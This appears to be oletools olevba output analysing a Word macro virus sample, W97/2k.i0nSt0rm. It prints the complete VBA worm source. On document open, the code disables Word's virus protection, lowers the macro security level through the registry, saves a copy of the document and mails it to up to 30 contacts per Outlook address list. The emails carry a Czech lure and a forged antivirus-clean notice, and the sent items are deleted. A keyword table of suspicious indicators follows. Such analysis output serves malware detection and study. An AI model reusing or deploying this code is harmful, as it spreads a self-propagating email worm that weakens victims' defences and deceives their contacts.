olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ion
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ion - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' W97/2k.i0nSt0rm
' Code by gl_st0rm
    
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Application.ShowVisualBasicEditor = False
Options.ConfirmConversions = False
Options.VirusProtection = False
Set FSO = CreateObject("Scripting.FileSystemObject")
Set dirwin = FSO.GetSpecialFolder(0)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
 If regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\i0nSt0rm") <> "...by gl" Then
  user = regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
  ActiveDocument.SaveAs FileName:=dirwin & "\ftip.doc", FileFormat:=wdFormatDocument
  Set Outlook = CreateObject("Outlook.Application")
  Set MAPI = Outlook.GetNameSpace("MAPI")
      MAPI.Logon "profile", "password"
      For Y = 1 To MAPI.AddressLists.Count
          Set AddyBook = MAPI.AddressLists(Y)
          X = 1
          Set Out = Outlook.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Mail = AddyBook.AddressEntries(X)
              Out.Recipients.Add Mail
              X = X + 1
              If X > 30 Then oo = AddyBook.AddressEntries.Count
           Next oo
           Out.Subject = "RE:"
           Out.Body = "Chtel si ftipy, tak tady je mas!!! ;)))"
           Out.Body = Out.Body & vbCrLf & ""
           Out.Body = Out.Body & vbCrLf & "[" & user & "]"
           Out.Body = Out.Body & vbCrLf & "---"
           Out.Body = Out.Body & vbCrLf & "Odchozí zpráva neobsahuje viry."
           Out.Body = Out.Body & vbCrLf & "Zkontrolováno antivirovým systémem AVG (http://www.grisoft.cz)."
           Out.Body = Out.Body & vbCrLf & "Verze: 6.0.219 / Virová báze: 103 - datum vydání: 5.12.2000"
           Out.Body = Out.Body & vbCrLf & vbCrLf & vbCrLf & vbCrLf
           Out.Attachments.Add (dirwin & "\ftip.doc")
           Out.DeleteAfterSubmit = True
           Out.Send
           Mail = ""
      Next Y
      MAPI.Logoff
      regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\i0nSt0rm", "...by gl"
 End If
'Application.Quit
End Sub
Private Sub Document_Close()
Dim M
M = Int((3 * Rnd) + 1)
 If M = 2 Then
  msg = "W97/2k.i0nSt0rm" & vbCrLf & "code by gl_st0rm"
  MsgBox msg, vbCritical, "Err0r! :->"
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.grisoft.c|URL                                          |
|          |z                   |                                             |
+----------+--------------------+---------------------------------------------+

